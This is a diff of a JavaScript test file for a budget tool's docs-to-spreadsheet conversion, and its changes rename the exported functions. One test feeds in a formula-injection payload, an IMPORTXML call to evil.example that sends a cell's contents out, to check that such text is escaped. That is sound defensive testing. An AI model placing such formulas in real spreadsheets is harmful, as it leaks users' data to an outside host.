@@ -59,32 +59,32 @@ const fixture = () => ({
 });
 
 test("docs -> tables -> docs round trip is lossless", () => {
-  const { ctx } = fakeGoogle(), { docsToTables, tablesToDocs } = ctx.module.exports;
-  const data = fixture(), back = JSON.parse(JSON.stringify(tablesToDocs(docsToTables(data, true)))); // JSON copy: vm arrays are another realm
+  const { ctx } = fakeGoogle(), { docsToTables_, tablesToDocs_ } = ctx.module.exports;
+  const data = fixture(), back = JSON.parse(JSON.stringify(tablesToDocs_(docsToTables_(data, true)))); // JSON copy: vm arrays are another realm
   assert.deepEqual(normalizeData(back), normalizeData(data));
   assert.equal(back.periods["2030-01-15"].bank.balance, null);
   assert.deepEqual(back.loans.l1.bills, ["Car payment", "Car loan"]);
 });
 
 test("formula-looking text is stored escaped and comes back unchanged", () => {
-  const { ctx } = fakeGoogle(), { docsToTables, tablesToDocs } = ctx.module.exports;
+  const { ctx } = fakeGoogle(), { docsToTables_, tablesToDocs_ } = ctx.module.exports;
   const data = fixture(), evil = '=IMPORTXML("https://evil.example/?q="&A1,"//a")';
   data.recurring.r1.name = evil; data.periods["2030-01-15"].bills[0].notes = "-5 adjustment";
-  const t = docsToTables(data, true);
+  const t = docsToTables_(data, true);
   const nameCell = t.RecurringBills[1][1];
   assert.equal(nameCell[0], "'");
   for (const tab of Object.values(t)) for (const row of tab.slice(1)) for (const v of row) if (typeof v === "string") assert.ok(!/^[=+\-@]/.test(v), "unescaped cell " + v);
-  const back = tablesToDocs(t);
+  const back = tablesToDocs_(t);
   assert.equal(back.recurring.r1.name, evil);
   assert.equal(back.periods["2030-01-15"].bills[0].notes, "-5 adjustment");
 });
 
 test("Date cells typed by hand in the Sheet read back as ISO text", () => {
-  const { ctx } = fakeGoogle(), { docsToTables, tablesToDocs } = ctx.module.exports;
-  const t = docsToTables(fixture(), true);
+  const { ctx } = fakeGoogle(), { docsToTables_, tablesToDocs_ } = ctx.module.exports;
+  const t = docsToTables_(fixture(), true);
   t.Paydays[1][3] = new Date(2030, 0, 15);
   t.PaydayBills[1][0] = new Date(2030, 0, 15); // the paydayId link itself
-  const back = tablesToDocs(t).periods["2030-01-15"];
+  const back = tablesToDocs_(t).periods["2030-01-15"];
   assert.equal(back.payDate, "2030-01-15");
   assert.equal(back.bills.length, 1);
 });
